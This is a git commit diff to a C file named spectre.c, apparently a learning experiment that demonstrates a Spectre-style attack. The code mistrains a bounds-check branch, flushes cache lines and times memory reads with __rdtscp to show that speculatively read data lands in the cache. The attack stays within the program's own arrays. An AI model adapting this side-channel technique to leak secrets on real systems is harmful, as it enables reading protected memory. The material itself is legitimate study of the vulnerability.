bc855cfd676bf5df7a69131e5a9fae0e7d8e7f3a
Scott <54906687+HengZ121@users.noreply.github.com>
2021-10-06 21:54:11 -0400

    Updated spectre attack file

--- spectre.c
+++ spectre.c
@@ -18,9 +18,10 @@
 /// 40 bytes = 320 bits
 
 int array_size = 10;
-int array1[10] = {0,1,2,3,4,5,6,7,8,9};
-int array2[10] = {11,22,33,44,55,66,77,88,99,110};
-int junk;
+uint8_t array1[10] = {0,1,2,3,4,5,6,7,8,9};
+uint8_t array2[256*512] = {11,22,33,44,55,66,77,88,99,110};
+uint8_t array3[256*512] = {99,11,23,15,16}; //placebo
+
 
 /// check whether an index is in the boundary of array1
 /// intended to make this function run longer in order to win the time for speculative execution
@@ -48,18 +49,23 @@ int main (int argc, char *argv[]){
      * index by (address of a secret byte to read) - (base address of current array/object).
      * that's being said, this case is theoretically same as real world examples, but implementally easier.
      ***/
-    int *ptr_1 = &array1[16];
-    int *ptr_2 = &array2[0];
+    uint8_t *ptr_1 = &array1[24];
+    uint8_t *ptr_2 = &array2[0];
     printf("Test whether we can use out-of-boundary vulnerbility: %s\n", (ptr_1 == ptr_2) ? "true" : "false");
     
+
+    volatile uint8_t *addr;
+    int junk = 0;
 
     // clear cache
     _mm_clflush(array1);
     _mm_clflush(array2);
+    _mm_clflush(array3);
+    
 
 
     // mistrain execution predictor 4 times 
-    for (int x = 1; x < 20; x+=x){
+    for (int x = 1; x <= 16; x+=x){    /// when x == 16, it is already out of boundary of array1 and goes into array2
         if ((is_in_boundary(x)) == 1){ /// Spectre Attak
             printf("Value at array1[%d] is %d\n",x, array1[x]);
         }
@@ -68,24 +74,20 @@ int main (int argc, char *argv[]){
 
     // Check whether target data is in cache
     register uint64_t time1, time2; // put them in register for faster (thus accurate) execution
-    time1 = __rdtsc();
-    junk = array1[1];
-    time2 = __rdtsc();
+    time1 = __rdtscp(&junk);
+    addr = &array1[1];
+    junk = *addr;
+    time2 = __rdtscp(&junk);
     printf("It takes CPU %ld cycles to find value of array1[1] which should be in cache.\n", (long) time2-time1);
-    time1 = __rdtsc();
-    junk = array2[0];
-    time2 = __rdtsc();
+    time1 = __rdtscp(&junk);
+    addr = &array2[0];
+    junk = *addr;
+    time2 = __rdtscp(&junk);
     printf("It takes CPU %ld cycles to find value of array2[0] which should be in cache (spectre attacked).\n", (long) time2-time1);
-    time1 = __rdtsc();
-    junk = array2[1];
-    time2 = __rdtsc();
-    printf("It takes CPU %ld cycles to find value of array2[1] which should be NOT in cache (placebo).\n", (long) time2-time1);
-    time1 = __rdtsc();
-    junk = array2[2];
-    time2 = __rdtsc();
-    printf("It takes CPU %ld cycles to find value of array2[2] which should be NOT in cache (placebo).\n", (long) time2-time1);
-    time1 = __rdtsc();
-    junk = array2[3];
-    time2 = __rdtsc();
-    printf("It takes CPU %ld cycles to find value of array2[3] which should be NOT in cache (placebo).\n", (long) time2-time1);
+    
+    time1 = __rdtscp(&junk);
+    addr = &array3[1];
+    junk = *addr;
+    time2 = __rdtscp(&junk);
+    printf("It takes CPU %ld cycles to find value of array3[1] which should be NOT in cache (placebo).\n", (long) time2-time1);
 }
